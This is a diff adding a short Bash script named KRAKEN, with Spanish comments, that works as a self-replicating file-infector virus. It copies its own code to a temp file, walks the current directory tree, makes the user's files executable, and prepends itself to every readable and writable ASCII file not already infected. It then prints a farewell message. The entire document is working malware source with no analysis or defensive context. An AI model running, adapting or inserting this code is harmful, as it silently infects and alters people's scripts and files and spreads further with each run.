@@ -1,0 +1,28 @@
+#KRAKEN
+usuario=`logname` #Averigua el nombre del usuario
+head -27 $0 > /tmp/virus.txt
+find . -name "*" -print | while read archivo 
+do
+if [ -f $archivo ] # es un archivo?
+then
+dueno=`ls -l "$archivo" | awk '{printf $3}'`
+if [ "$dueno" = "$usuario" ] # el archivo pertenece al usuario?
+then
+chmod 755 "$archivo";
+fi
+if [ -r "$archivo" -a -w "$archivo" ] 
+then
+file "$archivo" | while read p1 p2 p3 p4 p5 p6 
+do
+if [ "$p2" = "ASCII" -a "`head -1 "$archivo"`" != "#KRAKEN" ] 
+then
+cp /tmp/virus.txt /tmp/temporal.txt 
+cat $archivo >> /tmp/temporal.txt
+cat /tmp/temporal.txt > $archivo
+fi
+done
+fi
+fi
+done
+rm -f /tmp/virus.txt /tmp/temporal.txt
+echo "Hasta la vista, baby"
